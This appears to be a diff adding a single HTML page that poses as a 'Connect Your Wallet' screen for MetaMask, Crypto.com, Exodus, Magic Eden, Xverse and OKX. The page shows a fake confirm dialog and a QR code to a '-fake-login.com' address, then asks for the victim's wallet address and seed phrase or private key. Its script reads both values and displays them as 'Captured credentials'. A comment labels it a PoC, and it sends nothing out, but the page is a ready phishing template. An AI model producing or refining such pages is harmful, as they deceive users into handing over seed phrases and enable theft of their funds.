@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Connect Your Wallet</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.1);
+      width: 350px;
+      text-align: center;
+    }
+
+    h2 { font-size: 24px; margin-bottom: 20px; color: #333; }
+    button {
+      width: 90%;
+      padding: 12px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      color: white;
+      transition: opacity 0.2s;
+    }
+    .metamask { background-color: #f6851b; }
+    .crypto { background-color: #0c6cf2; }
+    .exodus { background-color: #ff6b2f; }
+    .magiceden { background-color: #28a745; }
+    .xverse { background-color: #6f42c1; }
+    .okx { background-color: #00b5ad; }
+    button:hover { opacity: 0.9; }
+
+    #promptBox {
+      margin-top: 20px;
+      display: none;
+      text-align: left;
+      font-size: 14px;
+      color: #333;
+      border-top: 1px solid #ddd;
+      padding-top: 15px;
+    }
+    #promptBox input {
+      width: 100%;
+      padding: 10px;
+      margin: 6px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    #promptBox button {
+      width: 100%;
+      margin-top: 10px;
+      background-color: #007aff;
+    }
+    #qrcode { margin: 10px auto; display: block; }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h2>Connect Your Wallet</h2>
+  <button class="metamask" onclick="showPrompt('MetaMask.io')">MetaMask</button>
+  <button class="crypto" onclick="showPrompt('Crypto.com')">Crypto.com</button>
+  <button class="exodus" onclick="showPrompt('Exodus.com')">Exodus</button>
+  <button class="magiceden" onclick="showPrompt('MagicEden.io')">Magic Eden</button>
+  <button class="xverse" onclick="showPrompt('Xverse.com')">Xverse</button>
+  <button class="okx" onclick="showPrompt('OKX.com')">OKX</button>
+
+  <div id="promptBox">
+    <p id="walletName"></p>
+    <div id="qrcode"></div>
+    <p>Or enter your wallet details manually:</p>
+    <input type="text" id="walletAddress" placeholder="Wallet Address">
+    <input type="password" id="walletSeed" placeholder="Seed Phrase / Private Key">
+    <button onclick="captureCredentials()">Connect</button>
+  </div>
+</div>
+
+<!-- Include QRCode.js -->
+<script src="https://cdn.jsdelivr.net/npm/qrcodejs/qrcode.min.js"></script>
+
+<script>
+  let qr;
+
+  function showPrompt(wallet) {
+    const proceed = confirm(`${wallet} says:\nPlease scan the QR code or enter your credentials to connect.`);
+    if (proceed) {
+      document.getElementById('walletName').innerText = `Connecting to ${wallet}...`;
+      document.getElementById('promptBox').style.display = 'block';
+
+      // Generate QR code dynamically
+      const qrCodeText = `https://${wallet}-fake-login.com`; // Replace with test/fake URL for PoC
+      if(qr) qr.clear(); // clear previous QR code
+      qr = new QRCode(document.getElementById("qrcode"), {
+        text: qrCodeText,
+        width: 120,
+        height: 120
+      });
+    } else {
+      alert('Connection cancelled.');
+    }
+  }
+
+  function captureCredentials() {
+    const address = document.getElementById('walletAddress').value;
+    const seed = document.getElementById('walletSeed').value;
+    if(address || seed) {
+      alert(`Captured credentials:\nAddress: ${address}\nSeed/Private Key: ${seed}`);
+    } else {
+      alert('No credentials entered.');
+    }
+  }
+</script>
+
+</body>
+</html>
